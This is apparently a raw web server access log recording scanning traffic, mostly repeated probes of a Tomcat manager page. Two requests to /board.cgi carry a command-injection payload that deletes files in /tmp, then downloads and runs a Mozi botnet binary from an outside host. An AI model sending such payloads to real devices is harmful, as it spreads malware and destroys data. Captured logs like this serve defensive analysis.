191.254.134.204 - - [30/Dec/2020:02:31:19 +0000] "GET / HTTP/1.1" 200 1
59.96.37.33 - - [30/Dec/2020:02:38:58 +0000] "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://59.96.37.33:41457/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0" 404 1083
192.241.213.57 - - [30/Dec/2020:02:40:04 +0000] "GET /actuator/health HTTP/1.1" 404 1093
190.111.197.218 - - [30/Dec/2020:03:47:45 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:45 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:46 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:46 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:46 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:46 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:47 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:47 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:47 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:48 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:48 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:48 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:49 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:49 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:49 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:50 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:50 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:50 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:50 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:51 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:51 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:51 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:52 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:52 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:52 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:53 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:53 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:53 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:54 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:54 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
190.111.197.218 - - [30/Dec/2020:03:47:54 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
209.17.96.130 - - [30/Dec/2020:04:21:57 +0000] "GET / HTTP/1.1" 200 1
139.162.111.98 - - [30/Dec/2020:07:11:39 +0000] "GET / HTTP/1.1" 200 1
103.41.25.105 - - [30/Dec/2020:08:42:40 +0000] "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://103.41.25.105:57607/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0" 404 1083
51.222.85.62 - - [30/Dec/2020:09:37:24 +0000] "GET /login HTTP/1.0" 404 1079
51.222.85.62 - - [30/Dec/2020:09:37:24 +0000] "GET /manager/html/ HTTP/1.0" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:24 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:24 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:24 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:24 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:24 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:24 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:24 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:24 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:24 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:24 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:25 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:25 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:25 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:25 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
51.222.85.62 - - [30/Dec/2020:09:37:25 +0000] "GET /manager/html/ HTTP/1.1" 403 3503
